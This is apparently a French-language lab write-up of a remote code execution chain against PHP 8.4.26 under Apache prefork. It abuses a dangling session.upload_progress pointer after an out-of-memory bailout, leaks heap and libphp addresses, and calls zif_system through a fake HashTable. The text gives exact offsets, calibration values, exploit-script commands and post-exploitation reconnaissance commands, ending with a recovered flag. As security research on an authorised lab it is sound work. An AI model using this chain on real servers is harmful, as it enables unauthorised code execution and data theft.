# PHP2Shell : du lab Docker à la RCE distante et au flag

Date de la validation : 26 octobre 2026.

Ce document décrit la reproduction réalisée sur le lab privé autorisé
`http://192.168.125.10/index.php`. Les adresses, offsets et géométries ci-dessous
sont propres à PHP 8.4.26, Apache prefork, x86_64 et à cette construction
binaire. Ce n'est pas un exploit universel.

## Résultat

- fuite du chunk Zend MM : `0x717b64200000` ;
- fuite de `zval_ptr_dtor` : `0x717b6652db60` ;
- base de `libphp.so` : `0x717b65ecf000` ;
- adresse de `zif_system` : `0x717b66334370` ;
- RCE prouvée avec `sleep 5` ;
- exécution confirmée sous `www-data` ;
- flag lu dans `/var/www/proof.txt` :

```text
31050b60beddc661b64e11663431d2fa
```

Une élévation root n'était pas nécessaire : le flag était hors du DocumentRoot,
mais lisible par le compte Apache.

## 1. Construire le lab local de référence

Le lab principal se trouve dans `docker/php2shell-lab/`. Il utilise une image
PHP 8.4.26 amd64 épinglée par digest et publie uniquement sur le loopback de
l'hôte.

Sur Linux x86_64 natif :

```sh
cd docker/php2shell-lab
./scripts/up.sh
./scripts/status.sh
curl --noproxy '*' -fsS http://127.0.0.1:9090/index.php
./scripts/test.sh id
```

Pour changer le port local :

```sh
export PHP2SHELL_HOST_PORT=9191
./scripts/down.sh
./scripts/up.sh
./scripts/status.sh
./scripts/test.sh id
```

Sur Apple Silicon ou Linux ARM64, `ALLOW_EMULATION=1` permet de démarrer
l'image amd64 pour les smoke tests :

```sh
ALLOW_EMULATION=1 ./scripts/up.sh
```

La preuve ASLR/RCE de référence doit toutefois être produite sur Linux x86_64
natif. L'émulation QEMU/Rosetta change les timings et le comportement de
l'allocateur.

Le lab principal charge d'abord `zz-php2shell.ini`, qui contient les invariants
utiles à la chaîne :

```ini
memory_limit=8M
post_max_size=32M
max_input_vars=1000
session.upload_progress.enabled=1
session.upload_progress.cleanup=1
session.use_cookies=1
session.use_strict_mode=0
```

Un second fichier force `display_errors=Off` pour le PoC propre du dépôt. La
cible distante étudiée avait au contraire `display_errors=On`. Les deux profils
atteignent le même type de cycle de vie dangereux, mais leurs requêtes de fuite
ne sont pas interchangeables.

## 2. Comprendre la primitive A/B

Chaque phase utilise deux requêtes multipart sur le même child Apache :

```text
requête A
  -> PHP traite RFC 1867 avant index.php
  -> session.upload_progress initialise des globals de session
  -> un champ de 12 MiB dépasse memory_limit=8M
  -> le bailout OOM saute une partie du nettoyage
  -> un pointeur de session reste accroché à la mémoire de requête libérée

requête B
  -> de nouveaux champs multipart réallouent les chunks libérés
  -> l'ancien pointeur désigne maintenant une structure contrôlée
  -> la primitive devient une fuite ou un appel indirect
```

Le script PHP cible n'a pas besoin d'implémenter un upload. Le parsing
multipart et le callback `session.upload_progress` s'exécutent avant le code
applicatif. Ici, `index.php` contient uniquement :

```php
<?php echo "OK\n"; ?>
```

## 3. Pourquoi un worker neuf est obligatoire

La géométrie du tas dépend de l'historique du child. Une requête de contrôle,
un navigateur, un health check ou un précédent essai peut déplacer la zone
réallouée. Il ne faut donc jamais effectuer un GET entre une rotation réussie
et la requête A suivante.

La rotation envoie :

1. un multipart contenant des centaines de valeurs vivantes ;
2. les contrôles `PHPSESSID` et `PHP_SESSION_UPLOAD_PROGRESS` ;
3. un fichier court ;
4. un champ final de 12 MiB pour l'OOM ;
5. une requête de cleanup qui consomme l'état corrompu et termine le child.

Une réponse vide au cleanup est l'oracle utilisé dans ce lab. Apache prefork
recrée un child depuis le même master. Les mappings de code restent identiques,
mais le nouveau Zend MM repart d'un état propre.

Deux formes ont été utiles :

- la rotation standard : `1001` valeurs de `3000` octets ;
- après de nombreux essais et GET : `900` valeurs de `3000` octets.

La seconde forme est implémentée dans `run_known_command.py`.

## 4. Reconnaissance distante

La première requête passive a retourné :

```text
HTTP/1.1 200 OK
Server: Apache/2.4.69 (Debian)
X-Powered-By: PHP/8.4.26
Connection: close

OK
```

Les OOM contrôlés ont ensuite confirmé :

- `memory_limit=8M` ;
- `display_errors=On` ;
- mod_php avec Apache prefork ;
- un seul worker disponible ;
- `session.upload_progress` exploitable avant l'application.

Le PoC `display_errors=Off` du lab local n'a donc pas été utilisé tel quel. Le
moteur public conservé dans `sources/alvarodh5-php2shell/exploit.py` a servi de
base au profil distant `display_errors=On`.

## 5. Phase 1 : fuite du chunk Zend MM

La requête A crée le pointeur dangling. La requête B réalloue le chunk de
`PS(id)` avec un faux `zend_string` dont la longueur vaut `0x1000`.

Lors de la génération du header `Set-Cookie`, PHP lit alors au-delà de la
chaîne réelle. Les pointeurs observés dans les 4096 octets divulgués sont
regroupés par région de 2 MiB. La région dominante donne :

```text
Zend MM chunk base = 0x717b64200000
```

Cette étape contourne l'ASLR du tas sans lire `/proc` et sans debugger sur la
cible.

## 6. Phase 2 : fuite de libphp

Le PoC public créait initialement `983` tableaux et développait le tableau
d'index `406`. Sur cette cible, les allocations effectuées après l'index 406
écrasaient la structure intéressante.

La calibration a consisté à :

1. confirmer par recherche binaire que l'overlap se produit à l'index `406` ;
2. conserver cet objet comme dernière allocation ;
3. réduire le total à `N=407`, avec `T=406` et 16 enfants.

Le cookie résultant vaut :

```text
100000000000000060db52667b710000
```

Décodage little-endian :

```text
nNextFreeElement = 0x10
zval_ptr_dtor    = 0x717b6652db60
```

Pour l'image officielle PHP 8.4.26 trixie x86_64 utilisée par cette cible :

```text
zval_ptr_dtor offset = 0x65eb60
zif_system offset    = 0x465370
```

Calculs :

```text
libphp = 0x717b6652db60 - 0x65eb60
       = 0x717b65ecf000

zif_system = 0x717b65ecf000 + 0x465370
           = 0x717b66334370
```

## 7. Phase 3 : faux HashTable et exécution

La troisième phase réalloue `PS(http_session_vars)` avec une fausse référence
vers un faux `HashTable`. Les valeurs utilisées sont :

```text
HTDATA offset = 0x690d8
HTDATA        = 0x717b64200000 + 0x690d8
              = 0x717b642690d8

pDestructor   = zif_system
              = 0x717b66334370
```

Le faux `execute_data` contient un argument chaîne qui devient la commande du
shell. Le carrier de 167 octets limite cette commande à 14 octets.

## 8. Preuve de RCE sans dépendre du filesystem

Les premiers essais `id` ne rendaient pas la sortie : le child terminait avant
que PHP vide son buffer HTTP. Une redirection relative dépendait aussi du
répertoire courant Apache.

La preuve robuste a donc utilisé :

```text
sleep 5
```

Mesures observées :

```text
rotation OOM       4.904 s   693 octets
rotation cleanup   0.260 s   réponse vide
terminal A         3.056 s   367 octets
terminal B         5.220 s   réponse vide
```

Sans exécution, le POST B ferme normalement la connexion en environ `0,2 s`.
Le délai supplémentaire de cinq secondes confirme l'appel de `zif_system`.

Commande de reproduction après redémarrage d'Apache :

```sh
python3 lab/offsec/rce_display_on.py --assume-fresh
```

Le script refait les deux fuites, recalcule les adresses et utilise `sleep 5`
par défaut. Sans redémarrage préalable, retirer `--assume-fresh` pour demander
une rotation initiale.

## 9. Exécuter d'autres commandes courtes

Tant que le master Apache ne redémarre pas, les workers recréés héritent des
mêmes mappings. Après une fuite complète réussie, le helper suivant réutilise
les adresses et retente la phase terminale :

```sh
python3 lab/offsec/run_known_command.py -c 'whoami>f'
curl -sS http://192.168.125.10/f
```

Résultat :

```text
www-data
```

`run_known_command.py` est volontairement spécifique à cette instance et à ce
master Apache. Après tout redémarrage du master, il faut relancer
`rce_display_on.py` et actualiser ses constantes avant de le réutiliser.

## 10. Recherche et récupération du flag

Les premières hypothèses ont été testées avec des commandes de 14 octets au
maximum :

```text
cat /flag>f       -> fichier HTTP créé mais vide
cat /flag*>f      -> aucun fichier /flag*
env >f            -> aucune variable FLAG
ls -la / >f       -> aucun flag à la racine
whoami>f          -> www-data
sudo -l>f 2>&1    -> sudo absent
getcap -r />f     -> aucune file capability exploitable
ls -l /bin/>f     -> seulement les SUID Debian standards
mount>f           -> aucun socket ou device hôte exploitable
```

Il n'était pas utile de devenir root. Un inventaire récursif de `/var` a
révélé `proof.txt` à côté du DocumentRoot :

```sh
python3 lab/offsec/run_known_command.py -c 'ls -Ra /var>f'
curl -sS http://192.168.125.10/f | grep -i proof
```

Le répertoire courant du worker est `/var/www/html`, confirmé par `env`. La
commande courte suivante lit donc `/var/www/proof.txt` :

```sh
python3 lab/offsec/run_known_command.py -c 'cat ../p*>f'
curl -sS http://192.168.125.10/f
```

Sortie :

```text
31050b60beddc661b64e11663431d2fa
```

## 11. Fichiers produits

- `lab/offsec/rce_display_on.py` : chaîne distante complète avec fuites ;
- `lab/offsec/run_known_command.py` : commandes terminales après calibration ;
- `artifacts/remote-192.168.125.10-20261026.md` : rapport de validation ;
- `sources/alvarodh5-php2shell/exploit.py` : moteur multipart réutilisé ;
- `docker/php2shell-lab/` : lab local isolé et reproductible.

## 12. Limites et règles de reproductibilité

1. Utiliser uniquement un système possédé ou explicitement autorisé.
2. Ne pas envoyer de health check entre une rotation et la requête A.
3. Toute requête parasite peut changer le worker ou la géométrie du tas.
4. Une réponse vide n'est pas, seule, une preuve de RCE ; la preuve temporelle
   `sleep 5` ou un effet vérifiable est nécessaire.
5. Un redémarrage du master invalide toutes les adresses absolues.
6. Les offsets ELF dépendent du build exact, pas seulement de la version PHP.
7. Le helper à adresses connues ne remplace jamais les fuites initiales sur une
   nouvelle cible.
8. Le fichier `f` est un artefact temporaire créé dans le DocumentRoot et doit
   être supprimé après collecte de la preuve.
